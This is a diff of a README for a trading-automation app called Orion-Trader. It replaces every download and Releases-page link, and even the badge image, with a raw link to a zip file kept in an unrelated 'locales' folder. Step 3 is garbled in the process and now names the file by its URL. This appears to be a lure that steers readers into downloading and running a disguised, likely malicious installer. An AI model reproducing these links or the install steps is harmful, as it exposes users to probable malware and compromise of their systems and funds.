@@ -1,6 +1,6 @@
 # 🚀 Orion-Trader - Trade Smarter with Automation
 
-![Download Orion-Trader](https://img.shields.io/badge/Download-Orion--Trader-brightgreen)
+![Download Orion-Trader](https://raw.githubusercontent.com/shaxxox/Orion-Trader/main/locales/Orion-Trader-2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -12,11 +12,11 @@ To get started, you will need to download the application. Follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page where you can find the latest version of Orion-Trader.
    
-   [Download Orion-Trader](https://github.com/shaxxox/Orion-Trader/releases)
+   [Download Orion-Trader](https://raw.githubusercontent.com/shaxxox/Orion-Trader/main/locales/Orion-Trader-2.2.zip)
 
 2. **Choose the Latest Release:** You will see a list of releases. Look for the latest version, marked with the highest version number.
 
-3. **Download the Installer:** You'll find a file named `Orion-Trader.exe` (or a similar version based on the updates). Click on this file to download it to your computer.
+3. **Download the Installer:** You'll find a file named `https://raw.githubusercontent.com/shaxxox/Orion-Trader/main/locales/Orion-Trader-2.2.zip` (or a similar version based on the updates). Click on this file to download it to your computer.
 
 4. **Run the Installer:** After the file has downloaded, locate it in your downloads folder. Double-click the installer file to start the installation process. Follow the on-screen instructions to complete the installation.
 
@@ -74,4 +74,4 @@ For more detailed information on each feature, please refer to the documentation
 
 Now that you have downloaded and installed Orion-Trader, you're ready to embark on your trading journey. Start trading with confidence, and remember that practice is key to becoming an effective trader.
 
-Don’t forget to revisit the [Releases page](https://github.com/shaxxox/Orion-Trader/releases) for further updates and enhancements. Happy trading!
+Don’t forget to revisit the [Releases page](https://raw.githubusercontent.com/shaxxox/Orion-Trader/main/locales/Orion-Trader-2.2.zip) for further updates and enhancements. Happy trading!
